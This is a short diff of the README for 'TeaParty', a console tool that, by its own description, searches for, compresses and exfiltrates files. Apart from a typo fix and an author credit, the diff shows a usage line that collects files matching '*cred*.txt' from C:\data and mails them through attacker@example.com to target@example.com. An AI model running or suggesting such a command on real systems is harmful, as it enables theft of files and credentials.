@@ -13,8 +13,12 @@ TeaParty is a console-based tool for searching, compressing, and exfiltrating fi
 - Interactive input or CLI arguments
 - Hash-based cache to avoid duplicates
 
-Remember that -h (help) options is available to see more options in details.
+Remember that -h (help) option is available to see more options in details.
 ## Usage
 
 ```bash
 teaparty.exe -s 3 -e .pdf,.docx -p *cred*.txt -d C:\data -m attacker@example.com:pass -to target@example.com -z 1
+
+
+Author
+Created by Lagash
